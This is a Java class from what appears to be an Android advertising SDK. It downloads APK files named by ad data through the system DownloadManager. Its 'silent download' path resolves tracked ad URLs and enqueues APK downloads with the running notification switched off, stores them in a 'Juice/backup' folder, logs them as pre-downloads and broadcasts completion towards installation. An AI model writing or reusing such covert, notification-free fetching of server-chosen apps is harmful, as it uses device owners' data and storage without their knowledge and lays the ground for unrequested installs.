package com.curtain.koreyoshi.download;

import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.curtain.koreyoshi.bean.AdData;
import com.curtain.koreyoshi.business.gptracker.TrackUtils;
import com.curtain.koreyoshi.business.gptracker.dowloadtracker.TrackDLUrlListerner;
import com.curtain.koreyoshi.business.gptracker.dowloadtracker.TrackDownloadUrlUtil;
import com.curtain.koreyoshi.business.popad.PopAdManager;
import com.curtain.koreyoshi.business.statistics.StatisticsUtil;
import com.curtain.koreyoshi.data.AdSharedPreference;
import com.curtain.koreyoshi.init.Config;
import com.curtain.koreyoshi.init.Constants;
import com.curtain.koreyoshi.utils.PackageInstallUtil;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by kings on 16/6/16.
 */
public class DownloadBySy implements PackDownloaderInterface {

    private static final String TAG = DownloadBySy.class.getSimpleName();
    private static final boolean DEBUG_DOWNLOAD = Config.DOWNLOAD_LOG_ENABLE;

    android.app.DownloadManager downloadManager;
    Context mContext;

    private DownloadBySy(Context context) {
        if (downloadManager == null) {
            downloadManager = (android.app.DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
            mContext = context;
        }
    }

    private static DownloadBySy mPackageDownloader = null;

    public static DownloadBySy getInstance(Context context) {
        if (mPackageDownloader == null) {
            mPackageDownloader = new DownloadBySy(context);
        }
        return mPackageDownloader;
    }
    @Override
    public void startDownload(AdData adData) {
        if(adData == null)  return;

        doStartDownload(adData, true);
    }

    @Override
    public void startSilentDownload(final AdData adData) {
        if(adData == null)  return;

        if (adData.getBehave() == 1) {
            String downloadUrl = adData.getTargetUrl();
            if (downloadUrl == null || "".equals(downloadUrl)){
                return;
            }
            if (TrackUtils.isDownloadUrl(downloadUrl)){
                doStartDownload(adData, false);
            }else{
                TrackDownloadUrlUtil.trackDownloadUrl(mContext, adData.getTargetUrl(), new TrackDLUrlListerner() {
                    @Override
                    public void onTrackSuccess(String apkUrl) {
                        adData.setTargetUrl(apkUrl);
                        PopAdManager.getInstance(mContext).updateAdTargetUrl(adData, apkUrl);
                        doStartDownload(adData, false);
                    }

                    @Override
                    public void onTrackFailed() {
                        //如果预下载ddl广告，但是下载的url获取失败了 就重置上次预下载时间为昨天
                        long lastTime = System.currentTimeMillis() - 3 * Constants.HOUR;
                        AdSharedPreference.setSilentDownloadDate(mContext, lastTime);
                        int alreadyTime = AdSharedPreference.getSlientDownloadTime(mContext);
                        AdSharedPreference.setSlientDownloadTime(mContext, alreadyTime - 1);
                    }
                });
            }
            //Toast.makeText(mContext, adData.getPackageName() + " : " + adData.getBehave(), Toast.LENGTH_SHORT).show();
        }else if (adData.getBehave() == 2){
            doStartDownload(adData, false);
        }
    }

    public void doStartDownload(AdData adData,boolean showNotify){
        String downloadUrl = adData.getTargetUrl();
        String packageName = adData.getPackageName();

        if (notValid(downloadUrl) || notValid(packageName)) {
            Log.e(TAG, "invalid url or pname");
            return;
        }

        int packageNameHash = packageName.hashCode();
        if (packageNameHash == -1) {
            Log.e(TAG, "pname hash failed");
            return;
        }

        String fileName = null;
        try {
            fileName = String.valueOf(packageNameHash);
        } catch (Exception e) {
            Log.e(TAG, "fileName from pname hash failed");
            return;
        }

        boolean notNeedNew = notNeedNewDownload(adData, fileName, downloadUrl);

        if (notNeedNew){
            Log.e(TAG, "not need add new---");
        }else {
            android.app.DownloadManager.Request request = generateRequest(
                    downloadUrl,
                    fileName,
                    adData.getTitle(),
                    showNotify);

            long id = downloadManager.enqueue(request);

            PopAdManager.getInstance(mContext).updateDownloadId(adData,id);
            PopAdManager.getInstance(mContext).refreshAdStatus(adData, AdData.STATUS_DOWNLOADING);

            StatisticsUtil.getInstance(mContext).statisticsAdDownload(mContext, adData);

            if(showNotify) {
                StatisticsUtil.getInstance(mContext).statisticsAdNormalDownload(mContext, adData);
            } else {
                StatisticsUtil.getInstance(mContext).statisticsAdPreDownload(mContext, adData);
            }

        }

    }

    private boolean notNeedNewDownload(AdData adData,String fileName, String downloadUrl) {
//        StackTraceElement[] stackTrace = new Exception().getStackTrace();
//        for(StackTraceElement e: stackTrace) {
//            Log.d("lee", e.getClassName() + " \t" + e.getMethodName() + " \t" + e.getLineNumber());
//        }

        boolean notNeedNew = false;
        List<DownloadRecord> records = queryDownloadRecords();
        for (DownloadRecord record: records){

            String local_filename = record.getLocal_filename();
            String url = record.getDownloadUrl();
            if (local_filename != null && url != null) {
                if (local_filename.contains(fileName) || url.equals(downloadUrl)) {
                    long id = record.get_id();
                    PopAdManager.getInstance(mContext).updateDownloadId(adData,id);
                    //下载中
                    int i = record.getStatus();
                    if (Downloads.Impl.isStatusInformational(i)) {
                        notNeedNew = true;
                    }

                    if (Downloads.Impl.isStatusSuccess(i)) {
                        String fileSavePath = local_filename;
                        if (!new File(fileSavePath).exists()) {
                            fileSavePath = Constants.DOWNLOAD_DIR + fileName;
                        }

                        boolean valideApkFile = PackageInstallUtil.isValideApkFile(mContext, fileSavePath);
                        if (valideApkFile) {
                            //发下载完成广播
                            Intent intent = new Intent(Constants.MY_DOWNLOAD_COMPLETE_ACTION);
                            intent.putExtra(android.app.DownloadManager.EXTRA_DOWNLOAD_ID, record.get_id());
                            mContext.sendBroadcast(intent);
                            notNeedNew = true;
                        } else {//虽然数据库中标识下载完了，但是不是有效apk,所以需要将其删掉
                            new File(fileSavePath).delete();
                            downloadManager.remove(record.get_id());
                        }
                    }
                    break;
                } else {
                    File file = new File(Constants.DOWNLOAD_DIR + fileName);
                    if(file.exists()) {
                        file.delete();
                    }
                }
            }
        }
        return notNeedNew;
    }
    private boolean isFolderCreate(){
        File folder = new File(Constants.DOWNLOAD_DIR);
        return (folder.exists() && folder.isDirectory()) ? true : folder.mkdirs();
    }
    private android.app.DownloadManager.Request generateRequest(String downloadUrl, String fileName, String title, boolean showNotify) {
        android.app.DownloadManager.Request request = new android.app.DownloadManager.Request(Uri.parse(downloadUrl));
        if (isFolderCreate()) {
            try {
                request.setDestinationInExternalPublicDir("Juice/backup", fileName);
            }catch (IllegalStateException e){
                e.printStackTrace();
            }
        }
        request.setTitle(title);
        request.setDescription("Downloading");
        /*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB) {
            if (showNotify){
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
            }else {
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN);
//                request.setShowRunningNotification(false);
            }
        }*/
        request.setShowRunningNotification(showNotify);
        return request;
    }

    public DownloadRecord queryDownloadRecord(long downloadId){
        android.app.DownloadManager.Query query = new android.app.DownloadManager.Query();
        query.setFilterById(downloadId);
        Cursor cursor = downloadManager.query(query);
        DownloadRecord record = new DownloadRecord();
        if (cursor != null) {
            int idIndex = cursor.getColumnIndex(DownloadManager.COLUMN_ID);
            int filenameIndex = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_FILENAME);
            if (filenameIndex == -1){
                filenameIndex =cursor.getColumnIndex("_data");
            }
            int statusIndex = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS);
            int uriIndex = cursor.getColumnIndex(DownloadManager.COLUMN_URI);
            if (idIndex != -1 && filenameIndex != -1 && statusIndex != -1 && uriIndex != -1) {
                if (cursor.moveToFirst()) {
                    String downId = cursor.getString(idIndex);
                    String filename = cursor.getString(filenameIndex);
                    String status = cursor.getString(statusIndex);
                    String uri = cursor.getString(uriIndex);
                    record.set_id(Long.parseLong(downId));
                    record.setDownloadUrl(uri);
                    record.setLocal_filename(filename);
                    record.setStatus(Integer.parseInt(status));
                }
            }
            cursor.close();
        }
        return record;
    }

    public List<DownloadRecord> queryDownloadRecords(){
//        StackTraceElement[] stackTrace = new Exception().getStackTrace();
//        for(StackTraceElement e: stackTrace) {
//            Log.d("lee", e.getClassName() + " \t" + e.getMethodName() + " \t" + e.getLineNumber());
//        }
        List<DownloadRecord> records = new ArrayList<>();
        android.app.DownloadManager.Query query = new android.app.DownloadManager.Query();
        Cursor cursor = downloadManager.query(query);
        if (cursor != null) {
            DownloadRecord record;
            int idIndex = cursor.getColumnIndex(DownloadManager.COLUMN_ID);
            int filenameIndex = cursor.getColumnIndex(DownloadManager.COLUMN_LOCAL_FILENAME);
            if (filenameIndex == -1){
                filenameIndex =cursor.getColumnIndex("_data");
            }
            int statusIndex = cursor.getColumnIndex(DownloadManager.COLUMN_STATUS);
            int uriIndex = cursor.getColumnIndex(DownloadManager.COLUMN_URI);
            if (idIndex != -1 && filenameIndex != -1 && statusIndex != -1 && uriIndex != -1) {
                while (cursor.moveToNext()) {
                    record = new DownloadRecord();

                    String downId = cursor.getString(idIndex);
                    String filename = cursor.getString(filenameIndex);
                    String status = cursor.getString(statusIndex);
                    String uri = cursor.getString(uriIndex);
                    record.set_id(Long.parseLong(downId));
                    record.setDownloadUrl(uri);
                    record.setLocal_filename(filename);
                    record.setStatus(Integer.parseInt(status));
                    records.add(record);
                }
            }
            cursor.close();
        }
        return records;
    }

    public int removeDownload(long id){
        return downloadManager.remove(id);
    }



    private boolean notValid(String t) {
        if (t == null || "".equals(t.trim())) {
            return true;
        }
        return false;
    }
}
